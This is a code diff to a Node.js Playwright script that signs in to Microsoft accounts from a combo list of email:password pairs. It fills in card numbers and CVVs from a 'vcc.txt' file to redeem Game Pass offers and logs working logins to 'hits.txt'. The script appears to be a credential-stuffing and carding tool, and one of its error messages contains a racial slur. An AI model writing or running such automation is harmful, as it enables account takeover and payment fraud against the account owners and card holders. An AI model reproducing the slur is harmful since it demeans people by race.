@@ -1,94 +1,83 @@
 const { firefox } = require("playwright")
-
+const fs = require('fs');
 function generateUsername(length) {
     let result = '';
     const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
     const charactersLength = characters.length;
     let counter = 0;
     while (counter < length) {
-      result += characters.charAt(Math.floor(Math.random() * charactersLength));
-      counter += 1;
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+        counter += 1;
     }
     return result;
 }
 
 const sleep = ms => new Promise(res => setTimeout(res, ms));
 
+function readFileAndSplitLines(filePath) {
+  return new Promise((resolve, reject) => {
+    fs.readFile(filePath, 'utf8', (err, data) => {
+      if (err) {
+        reject(err);
+        return;
+      }
+
+      // Split the data into lines
+      const lines = data.split('\n');
+
+      // Trim whitespace from each line (optional)
+      const trimmedLines = lines.map(line => line.trim());
+
+      resolve(trimmedLines);
+    });
+  });
+}
+
 async function main() {
-    console.log("This library is sponsored by XAG || https://discord.gg/z7A9wf6D")
-    
+    console.log("This library is sponsored by XAG || https://discord.gg/z7A9wf6D");
+
     const state = "North Carolina";
     const stateAbbreviated = "NC".toLowerCase();
     const address = "207 Fire Access Road";
     const city = "Greensboro";
     const zipcode = "27406";
+    let comboList = process.argv[2];
+    let offerId = process.argv[3];
+    let cardVCC = process.argv[4];
 
-    let email = process.argv[2];
-    let password = process.argv[3];
-    let offerId = process.argv[4];
-    let cardVCC = process.argv[5];
-
-    if (!email || !password || !offerId || !cardVCC) {
+    if (!comboList || !offerId || !cardVCC) {
         console.log("Please enter the following information:");
 
-        const readline = require('readline').createInterface({
-            input: process.stdin,
-            output: process.stdout
-        });
+        try {
+            const [comboListLines, offerIdLines, cardVCCLines] = await Promise.all([
+                readFileAndSplitLines('combolist.txt'),
+                readFileAndSplitLines('codes.txt'),
+                readFileAndSplitLines('vcc.txt')
+            ]);
 
-        await new Promise((resolve, reject) => {
-            readline.question("Email: ", (input) => {
-                email = input;
-                resolve();
-            });
-        });
-
-        await new Promise((resolve, reject) => {
-            readline.question("Password: ", (input) => {
-                password = input;
-                resolve();
-            });
-        });
-
-        await new Promise((resolve, reject) => {
-            readline.question("Offer ID: ", (input) => {
-                offerId = input;
-                resolve();
-            });
-        });
-
-        await new Promise((resolve, reject) => {
-            readline.question("Card VCC: ", (input) => {
-                cardVCC = input;
-                resolve();
-            });
-        });
-
-        readline.close();
-
-        console.log("\nEntered information:");
-        console.log("Email:", email);
-        console.log("Password:", password);
-        console.log("Offer ID:", offerId);
-        console.log("Card VCC:", cardVCC);
-    } else {
-        console.log("Using provided arguments:");
-        console.log("Email:", email);
-        console.log("Password:", password);
-        console.log("Offer ID:", offerId);
-        console.log("Card VCC:", cardVCC);
+            comboList = comboListLines[0];
+            offerId = offerIdLines[0];
+            cardVCC = cardVCCLines[0];
+        } catch (err) {
+            console.error(err);
+        }
     }
 
-    console.log("This gen only supports xag accounts! Otherwise it won't work.")
+    console.log("This gen only supports xag accounts! Otherwise it won't work."); // propaganda
+    const [email, password] = comboList.split(':');
+    const [cardNumber, cardExpMonth, cardExpYear, cardCvv] = cardVCC.split('|')
 
-    const [cardNumber, cardExpMonth, cardExpYear, cardCvv] = cardVCC.split('|');
+    console.log("Email:", email);
+    console.log("Password:", password);
+    console.log("Offer ID:", offerId);
+    console.log("Card VCC:", cardVCC);
 
     if (!cardNumber || !cardExpMonth || !cardExpYear || !cardCvv) {
         throw new Error("Invalid cc, you're a nigger")
     }
 
 
-    
+
     // const cardNumber = "5467758207407717";
     // const cardCvv = "645"
     // const cardExpMonth = "12";
@@ -99,11 +88,11 @@ async function main() {
     url += offerId;
 
     const browser = await firefox.launch({
-            headless: false
+        headless: false
     });
-    
+
     const page = await browser.newPage();
-    
+
     await page.goto(url);
     await page.getByLabel('Sign in or create a Microsoft').click();
     await page.getByTestId('i0116').fill(email);
@@ -156,7 +145,17 @@ async function main() {
     await page.getByRole('link', { name: 'Profile Name' }).click();
     await page.getByTestId('profile-name-input').click();
     await page.getByTestId('profile-name-input').fill(generateUsername(16));
-    await page.getByTestId('ChangeNameButton').click();
+    try {
+        await page.getByTestId('ChangeNameButton').click();
+        await console.log("Successfully applied gamepass!")
+        fs.append("hits.txt", `${email}:${password}\n`, function (err) {
+        if (err) throw err;
+        console.log('Saved!');
+        });
+    }
+    catch (exception) {
+        console.error(exception);
+    }
     // await page.getByLabel('Sign in or create a Microsoft').click();
     // await page.getByTestId('i0116').click();
     // await page.getByTestId('i0116').click();
